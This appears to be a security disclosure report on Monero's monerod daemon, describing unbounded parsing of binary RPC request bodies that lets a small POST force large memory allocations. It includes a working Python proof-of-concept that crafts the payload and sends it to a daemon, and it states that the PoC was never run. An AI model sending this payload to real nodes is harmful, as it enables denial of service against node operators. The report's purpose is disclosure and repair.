# `monerod`'s public `.bin` RPC endpoints parse attacker-controlled binary bodies with no object/field/string count limits, unlike every other consumer of the same parser

## Summary

`monerod` exposes several binary ("epee portable-storage") JSON-RPC-equivalent endpoints on its public HTTP RPC port — `/get_blocks.bin`, `/getblocks.bin`, `/get_blocks_by_height.bin`, `/get_hashes.bin`, `/gethashes.bin`, `/get_o_indexes.bin`, `/get_outs.bin`, `/get_output_distribution.bin` — none of which require a restricted-RPC login and none of which are gated behind `!m_restricted`. All of them parse the raw POST body through the same macro, `MAP_URI_AUTO_BIN2`, which calls the binary deserializer with no size limits:

```cpp
bool parse_res = epee::serialization::load_t_from_binary(static_cast<command_type::request&>(req), epee::strspan<uint8_t>(query_info.m_body));
```

This resolves to the 2-argument overload of `load_t_from_binary`, which passes `limits = NULL` down into the underlying parser (`portable_storage::load_from_binary`), leaving the parser's internal object/field/string counters uncapped (`std::numeric_limits<size_t>::max()`).

The same parser is used in exactly two other places in the codebase, and both of those explicitly pass a bound:
- Client-side, when a wallet or another daemon parses a *daemon's* binary RPC response: `contrib/epee/include/storages/http_abstract_invoke.h` passes `default_http_bin_limits = {196608, 196608, 196608}`.
- P2P-side, when a node parses a *peer's* levin message: `contrib/epee/include/storages/levin_abstract_invoke2.h` passes `default_levin_limits = {8192, 16384, 16384}`.

The one binary-parsing entry point that is actually exposed to arbitrary, pre-authentication internet clients is the only one with no limit at all. Because the deserializer's `reserve()` calls for array fields are sized using the wire format's minimum bytes-per-element (as little as 1 byte, for an empty nested object) rather than the real in-memory size of the C++ objects being allocated, a request body well under the daemon's own 1 MB content-length cap can force a single allocation on the order of several tens of megabytes.

## Severity

Monero severity: **MEDIUM** ("must be carefully exploited" / individual node resource exhaustion; Monero's own Vulnerability Response Process explicitly notes "a systematic DoS hunt has not been completed on any code").
Suggested CVSS v3.1: `6.5` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`.

Rationale:
1. Fully pre-authentication and network-reachable — no wallet-rpc credentials, no restricted-mode bypass, nothing beyond ordinary access to the daemon's RPC port (`AV:N/PR:N/UI:N`).
2. Bounded per-request amplification: the daemon's own 1 MB (`MAX_RPC_CONTENT_LENGTH`) request-body cap limits any single request to roughly a few tens of megabytes of forced allocation, not gigabytes — so I am rating availability impact `A:L` rather than `A:H`, since a single request is unlikely to crash a well-provisioned node outright. Repeated/concurrent requests could compound this; I have not verified whether another layer of the HTTP stack independently rate-limits concurrent connections.
3. No confidentiality or integrity impact — this is a resource-consumption issue only.

## Affected Versions

Confirmed present by direct source review on:
- `v0.18.5.1` (latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`)
- current `master`

This asymmetry (unlimited server-side `.bin` parsing vs. bounded client-side and P2P parsing of the identical format) predates the current release and is not the result of a recent regression I could find; I did not bisect further back.

## Root Cause

`contrib/epee/include/net/http_server_handlers_map2.h`:
```cpp
#define MAP_URI_AUTO_BIN2(s_pattern, callback_f, command_type) \
    else if(query_info.m_URI == s_pattern) \
    { \
      handled = true; \
      uint64_t ticks = epee::misc_utils::get_tick_count(); \
      boost::value_initialized<command_type::request> req; \
      bool parse_res = epee::serialization::load_t_from_binary(static_cast<command_type::request&>(req), epee::strspan<uint8_t>(query_info.m_body)); \
      ...
```

`contrib/epee/include/storages/portable_storage_template_helper.h`:
```cpp
template<class t_struct>
bool load_t_from_binary(t_struct& out, const epee::span<const uint8_t> binary_buff, const epee::serialization::portable_storage::limits_t *limits = NULL)
{
  portable_storage ps;
  bool rs = ps.load_from_binary(binary_buff, limits);
  ...
}
```

`contrib/epee/include/storages/portable_storage_from_bin.h` (the actual deserializer):
```cpp
throwable_buffer_reader::throwable_buffer_reader(...)
{
  ...
  max_objects = std::numeric_limits<size_t>::max();
  max_fields  = std::numeric_limits<size_t>::max();
  max_strings = std::numeric_limits<size_t>::max();
}

template<class type_name>
storage_entry throwable_buffer_reader::read_ae()
{
  array_entry_t<type_name> sa;
  size_t size = read_varint();
  CHECK_AND_ASSERT_THROW_MES(size <= m_count / ps_min_bytes<type_name>::strict, "Size sanity check failed");
  if (std::is_same<type_name, section>())
  {
    CHECK_AND_ASSERT_THROW_MES(size <= max_objects - m_objects, "Too many objects");
    m_objects += size;
  }
  ...
  sa.reserve(size);   // <-- allocation happens here, before any element is actually read
  while(size--)
    sa.m_array.push_back(read<type_name>());
  return storage_entry(array_entry(std::move(sa)));
}
```
`ps_min_bytes<section>::strict == 1` — the only requirement to claim an array of `N` nested objects is that at least `N` bytes remain in the buffer (each empty nested object costs exactly one more byte, a zero-valued field-count varint, once actually read). Since `max_objects` is `SIZE_MAX` on this path, `size <= max_objects - m_objects` never fails, and `sa.reserve(size)` allocates `N` in-memory `section` objects (`std::map`-backed, tens of bytes each) from as little as `N` bytes of request body.

For comparison, the two call sites that *do* bound this:

`contrib/epee/include/storages/http_abstract_invoke.h`:
```cpp
static const constexpr epee::serialization::portable_storage::limits_t default_http_bin_limits = {
  65536 * 3, // objects
  65536 * 3, // fields
  65536 * 3, // strings
};
return serialization::load_t_from_binary(result_struct, epee::strspan<uint8_t>(pri->m_body), &default_http_bin_limits);
```

`contrib/epee/include/storages/levin_abstract_invoke2.h`:
```cpp
static const constexpr epee::serialization::portable_storage::limits_t default_levin_limits = {
  8192, 16384, 16384,
};
...
if(!stg_ret.load_from_binary(buff_to_recv, &default_levin_limits)) { ... }
```

## Steps to Reproduce

### 1. Build and run a target daemon

```
git clone --branch v0.18.5.1 --depth 1 https://github.com/monero-project/monero.git
cd monero && git submodule update --init --recursive
mkdir -p build/release && cd build/release
cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../..
make -j"$(nproc)" daemon

./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-bin/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --non-interactive &
echo "daemon pid: $!"
```

### 2. Craft the oversized binary body

The script below builds a minimal, well-formed epee portable-storage binary blob with one field ("x") whose declared value is an array of `N` empty nested objects, using only as many raw bytes as the wire format actually requires to keep the request under 1 MB. Any of the `.bin` routes will trigger the same parser; `/get_outs.bin` is used here purely as an example target — the crafted body does not need to resemble that endpoint's real request schema, because the vulnerable allocation happens while parsing the generic binary tree, before it is ever mapped onto the target struct's expected fields.

```python
#!/usr/bin/env python3
# poc_bin_rpc_amplify.py
import struct
import sys
import urllib.request

SIG_A = 0x01011101
SIG_B = 0x01020101
FMT_VER = 1

SERIALIZE_TYPE_OBJECT = 12
SERIALIZE_FLAG_ARRAY = 0x80

def varint(v: int) -> bytes:
    # size mark in the low 2 bits: 0=byte,1=word,2=dword,3=int64; value is left-shifted by 2
    if v <= 0x3F:
        return struct.pack("<B", (v << 2) | 0)
    if v <= 0x3FFF:
        return struct.pack("<H", (v << 2) | 1)
    if v <= 0x3FFFFFFF:
        return struct.pack("<I", (v << 2) | 2)
    return struct.pack("<Q", (v << 2) | 3)

def build_payload(n_sections: int) -> bytes:
    header = struct.pack("<IIB", SIG_A, SIG_B, FMT_VER)

    root_field_count = varint(1)                 # root section: 1 field
    field_name = b"x"
    field_name_hdr = struct.pack("<B", len(field_name)) + field_name
    ent_type = struct.pack("<B", SERIALIZE_TYPE_OBJECT | SERIALIZE_FLAG_ARRAY)
    array_size = varint(n_sections)
    # each "empty nested section" costs exactly one byte: a zero field-count varint
    elements = b"\x00" * n_sections

    body = header + root_field_count + field_name_hdr + ent_type + array_size + elements
    return body

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:38081/get_outs.bin"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 900_000

    payload = build_payload(n)
    print(f"POST {target}  body_size={len(payload)} bytes  claimed_nested_objects={n}")

    req = urllib.request.Request(target, data=payload, method="POST",
                                  headers={"Content-Type": "application/octet-stream"})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            print("HTTP", resp.status, resp.read()[:200])
    except Exception as e:
        print("request finished with:", e)
```

### 3. Run it while watching the daemon's memory

```
DAEMON_PID=$(pgrep -f 'monerod --regtest')
( while true; do ps -o rss= -p "$DAEMON_PID"; sleep 0.2; done ) &
WATCH_PID=$!

python3 poc_bin_rpc_amplify.py http://127.0.0.1:38081/get_outs.bin 900000

sleep 1
kill "$WATCH_PID"
```

### 4. Expected result on the vulnerable build

- The request body is under ~900 KB, comfortably inside the daemon's 1 MB `MAX_RPC_CONTENT_LENGTH`.
- The `ps -o rss=` samples taken during the request should show a sharp, transient spike (on the order of tens of megabytes above baseline) corresponding to the `sa.reserve(900000)` allocation of `section` objects, before the request is ultimately rejected (the crafted body's field name/type won't match `COMMAND_RPC_GET_OUTPUTS_BIN::request`'s real schema, so the RPC call itself fails after parsing completes — the point being demonstrated is the allocation that happens *during* parsing, not a successful RPC result).
- For contrast, replaying the same technique against a client-side binary response parser (`default_http_bin_limits`, cap 196608) or a P2P levin message (`default_levin_limits`, cap 8192/16384/16384) should fail fast with `"Too many objects"` instead of allocating — those two call sites are not reachable from an external HTTP client the way the `.bin` RPC endpoints are, but they demonstrate the bound this endpoint is missing.

## Possible Solution

Pass a `limits_t` into the `load_t_from_binary` call inside `MAP_URI_AUTO_BIN2`, mirroring `default_http_bin_limits` (or a value tuned for the daemon's actual expected request shapes), so that all three binary-parsing entry points in the codebase enforce the same discipline.

## Impact

Any client able to reach a `monerod` instance's HTTP RPC port — public nodes are a normal, supported deployment — can send a single POST request under 1 MB to any of the listed `.bin` endpoints and force a memory allocation roughly one to two orders of magnitude larger than the request itself, with no authentication and no restricted-mode gate in the way (the parse happens before any handler-level access check runs). Repeated or concurrent requests could compound the effect into a more serious memory-exhaustion denial of service; I have not measured that compounding effect directly.

## Note on AI usage

Source-code analysis of the binary parser and the three call sites was done with AI assistance, working directly against the `v0.18.5.1` release source, including reading the wire-format constants (`SERIALIZE_TYPE_*`, `SERIALIZE_FLAG_ARRAY`, the varint size-mark scheme, `storage_block_header`) to hand-derive the PoC payload byte-for-byte. **The PoC script has been checked for correctness against the exact deserialization code path but has not yet been run against a live `monerod` process** — no daemon was started or measured. Please run it, capture the actual RSS delta (or any other observable resource-usage signal you find informative), and attach that transcript before submitting, per this program's requirement for a working PoC with logs.
